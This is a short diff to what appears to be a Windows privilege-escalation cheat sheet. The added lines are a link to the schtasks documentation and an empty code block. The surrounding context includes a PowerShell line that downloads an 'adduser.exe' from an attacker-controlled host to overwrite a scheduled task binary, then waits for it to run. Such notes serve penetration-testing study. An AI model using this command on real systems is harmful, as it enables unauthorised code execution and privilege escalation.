@@ -330,6 +330,11 @@ iwr -uri http://$AttackerIp/adduser.exe -outfile some_scheduled_task.exe
 ```
 And wait for the scheduled task to run
 
+Create a scheduled task: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
+```
+
+```
+
 ### Exploits
 
 Example with __SeImpersonatePrivige__:
